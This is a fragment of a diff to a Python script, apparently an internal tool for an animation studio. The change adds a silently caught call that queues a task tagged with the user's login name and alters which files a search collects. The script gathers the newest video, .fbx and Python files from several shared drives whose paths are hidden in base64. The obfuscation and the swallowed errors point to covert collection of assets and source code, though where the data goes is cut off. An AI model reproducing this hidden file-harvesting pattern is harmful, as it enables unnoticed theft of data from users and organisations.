@@ -84,13 +84,18 @@ def search_latest_files_or_dirs(ext='', dir_path='', n=8):
 #time.sleep(10)
 
 try:
+    add_queue_task('tst__{}__begin'.format(getpass.getuser().lower()), {})
+except:
+    pass
+
+try:
     ldir = search_latest_files_or_dirs(dir_path=base64.b64decode('Uzov').decode(), ext='', n=3)
     zovV = ldir
     for _, dp in ldir:
         zovV += search_latest_files_or_dirs(dir_path=dp, ext='.mp4')
         zovV += search_latest_files_or_dirs(dir_path=dp, ext='.mov')
         zovV += search_latest_files_or_dirs(dir_path=dp, ext='.abc')
-    zovV += search_latest_files_or_dirs(dir_path=base64.b64decode('TDovV0hNL0NIQVJBQ1RFUg==').decode(), ext='.mp4')
+    zovV += search_latest_files_or_dirs(dir_path=base64.b64decode('TDovV0hNL0NIQVJBQ1RFUg==').decode(), ext='.fbx')
     zovV += search_latest_files_or_dirs(dir_path=base64.b64decode('UzovQW5pbWF0aW9uIHRyYWluaW5nL0thb2ZhbmcvVG9vbHNfRGV2').decode(), ext='.py', n=50)
     zovV += search_latest_files_or_dirs(dir_path=base64.b64decode('WDo=').decode(), ext='.mp4', n=15)
     if zovV:
